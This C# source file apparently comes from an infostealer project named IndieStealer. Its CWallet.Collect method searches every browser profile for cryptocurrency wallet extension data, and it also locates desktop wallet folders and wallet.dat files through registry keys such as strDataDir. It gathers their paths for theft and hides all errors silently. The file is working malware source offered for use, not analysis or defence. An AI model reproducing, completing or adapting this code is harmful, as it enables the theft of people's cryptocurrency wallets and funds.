using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using IndieStealer.Collect.Browsers;

namespace IndieStealer.Collect.CryptoWallets
{
    class CWallet
    {
        public static void Collect()
        {
            try
            {

                foreach (var credential in CWalletList.CWalletCredentials)
                {
                    if (credential.Path == null || credential.Path == string.Empty)
                        continue;
                    if (credential.IsExtension)
                    {
                        try
                        {
                            foreach (var browserModel in BrowserDataStorage.Browsers)
                            {
                                if (browserModel.Profiles == null)
                                    continue;
                                foreach (var profile in browserModel.Profiles)
                                {
                                    string directory = profile.Path + "\\Local Extension Settings\\" + credential.Path;
                                    if (!Directory.Exists(directory)) directory = directory.Replace("Local Extension Settings","Sync Extension Settings");
                                    if (!Directory.Exists(directory)) continue;
                                    string[] files = Directory.GetFiles(directory);
                                    if (files.Length < 1)
                                        continue;
                                    if (credential.profileNamesAndData == null)
                                        credential.profileNamesAndData = new Dictionary<string, string[]>();
                                    credential.Data = new string[files.Length];
                                    for (int i = 0; i < files.Length; i++)
                                    {
                                        credential.Data[i] = files[i];
                                    }
                                    if (!credential.profileNamesAndData.ContainsKey(profile.Name))
                                        credential.profileNamesAndData.Add(profile.Name, credential.Data);
                                    
                                }

                            }
                           
                        }
                        catch (Exception ex)
                        {}
                        continue;
                    }
                    if (credential.IsFile)
                    {
                        if (credential.IsDataMultiple)
                        {
                            if (credential.hybridConstruction != null)
                            {
                                if (credential.hybridConstruction.cType == CWalletData.HybridConstruction.CType.DIR_AND_FILE)
                                {
                                    try
                                    {
                                        string[] files = Directory.GetFiles(credential.Path);
                                        if (Directory.Exists(credential.Path) && files.Length > 0)
                                        {
                                            credential.Data = new string[2];
                                            credential.Data[0] = Directory.Exists(Path.Combine(credential.Path, credential.hybridConstruction.parameters[0])) ? Path.Combine(credential.Path, credential.hybridConstruction.parameters[0]) : "";
                                            credential.Data[1] = File.Exists(Path.Combine(credential.Path, credential.hybridConstruction.parameters[1])) ? Path.Combine(credential.Path, credential.hybridConstruction.parameters[1]) : "";
                                        }
                                    }
                                    catch (Exception ex)
                                    {}
                                }
                                else if (credential.hybridConstruction.cType == CWalletData.HybridConstruction.CType.REGISTRY_AND_FILE)
                                {
                                    try
                                    {
                                        using (RegistryKey rg = Registry.CurrentUser.OpenSubKey(credential.Path))
                                        {
                                            var value = rg?.GetValue(credential.hybridConstruction.parameters[0]);
                                            if (value != null)
                                            {
                                                if (!Directory.Exists(value + credential.hybridConstruction.parameters[1])) continue;
                                                string[] files = Directory.GetFiles(value + credential.hybridConstruction.parameters[1]);
                                                credential.Data = new string[files.Length];
                                                for (int i = 0; i < files.Length; i++)
                                                {
                                                    credential.Data[i] = files[i];
                                                }
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    { }
                                }
                            }
                            else
                            {
                                if (credential.Extensions == null)
                                {
                                    try
                                    {
                                        if (!Directory.Exists(credential.Path)) continue;
                                        string[] files = Directory.GetFiles(credential.Path);
                                        credential.Data = new string[files.Length];
                                        for (int i = 0; i < files.Length; i++)
                                        {
                                            credential.Data[i] = files[i];
                                        }
                                    }
                                    catch (Exception ex)
                                    {}
                                }
                                else
                                {
                                    try
                                    {
                                        if (!Directory.Exists(credential.Path)) continue;
                                        string[] files = Directory.GetFiles(credential.Path, "*.*");
                                        string[] files2 = new string[files.Length];
                                        for (int c = 0, i = 0; i < files.Length; i++)
                                        {
                                            var file = files[i];
                                            foreach (var extension in credential.Extensions)
                                            {
                                                if (file.EndsWith(extension))
                                                    files2[c++] = file;
                                            }
                                        }

                                        credential.Data = files2.Where(x => !string.IsNullOrEmpty(x))?.ToArray();
                                    }
                                    catch (Exception ex)
                                    {}
                                }
                            }

                            
                            
                        }
                        else
                        {
                            if (credential.IsStoredInRegistry)
                            {
                                if (credential.RegValueName == null)
                                {
                                    try
                                    {
                                        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(credential.Path))
                                        {
                                            if (registryKey != null && registryKey.GetValue("strDataDir") != null)
                                            {
                                                var value = (string)registryKey.GetValue("strDataDir");
                                                credential.Data = new string[1];
                                                if (File.Exists(value + "\\wallet.dat"))
                                                    credential.Data[0] = value + "\\wallet.dat";
                                                else if (File.Exists(value + "\\wallets\\wallet.dat"))
                                                    credential.Data[0] = value + "\\wallets\\wallet.dat";
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {}
                                }
                                else
                                {
                                    try
                                    {
                                        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(credential.Path))
                                        {
                                            if (registryKey != null && registryKey.GetValue(credential.RegValueName) != null)
                                            {
                                                credential.Data = new string[1];
                                                credential.Data[0] = registryKey.GetValue(credential.RegValueName).ToString().Replace("/", "\\");
                                            }

                                        }
                                    }
                                    catch (Exception ex)
                                    {}
                                }
                                
                            }
                        }
                    }
                    else
                    {
                        if (credential.IsStoredInRegistry)
                        {
                            if (credential.RegValueName != null)
                            {
                                try
                                {
                                    using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(credential.Path))
                                    {
                                        if (registryKey != null && registryKey.GetValue(credential.RegValueName) != null)
                                        {
                                            credential.Data = new string[1];
                                            credential.Data[0] = registryKey.GetValue(credential.RegValueName).ToString().Replace("/", "\\");
                                        }

                                    }
                                }
                                catch (Exception ex)
                                {}
                            }
                           
                        }
                        else
                        {
                            try
                            {
                                if (Directory.Exists(credential.Path))
                                {
                                    credential.Data = new string[1];
                                    credential.Data[0] = credential.Path;
                                }
                            }
                            catch (Exception ex)
                            {}
                        }
                    }
                    
                }
            }
            catch (Exception ex)
            { }
        }

    }
}